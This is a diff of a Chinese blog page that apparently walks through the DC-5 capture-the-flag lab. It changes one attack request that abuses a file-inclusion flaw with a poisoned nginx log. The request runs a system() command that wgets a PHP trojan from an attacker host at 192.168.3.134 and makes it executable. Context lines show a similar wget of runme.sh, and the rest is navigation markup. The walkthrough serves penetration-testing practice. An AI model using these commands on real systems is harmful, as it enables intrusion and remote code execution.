@@ -575,7 +575,7 @@ win7 192.168.3.137
 </code></pre>
 <p>做完这些后，打开burpsuite，拿出我们之前抓到的包</p>
 <p>构造参数</p>
-<pre class=" language-Linux"><code class="language-Linux">GET /thankyou.php?file=/var/log/nginx/access.log&a=system('cd /tmp;wget http://192.168.3.134/dcmuma.php;chmod +x dcmuma.php'); HTTP/1.1
+<pre class=" language-Linux"><code class="language-Linux">GET /thankyou.php?file=/var/log/nginx/access.log&a=system('cd /tmp;wget http://192.168.3.134:8000/dcmuma.php;chmod +x dcmuma.php'); HTTP/1.1
 </code></pre>
 <p><img src="/2022/05/01/DC-5/image-20220502112130409.png" alt="image-20220502112130409"></p>
 <p>可以看到上传成功</p>
@@ -875,18 +875,17 @@ wget http://192.168.3.134:8000/runme.sh
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/05/01/DC-5/">
+                <a href="/2022/05/02/DC-6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="综合实战第二章-DC-5">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="综合实战第二章-DC-6">
                         
-                        <span class="card-title">综合实战第二章-DC-5</span>
+                        <span class="card-title">综合实战第二章-DC-6</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -896,9 +895,9 @@ wget http://192.168.3.134:8000/runme.sh
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-01
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-02
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -911,7 +910,6 @@ wget http://192.168.3.134:8000/runme.sh
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
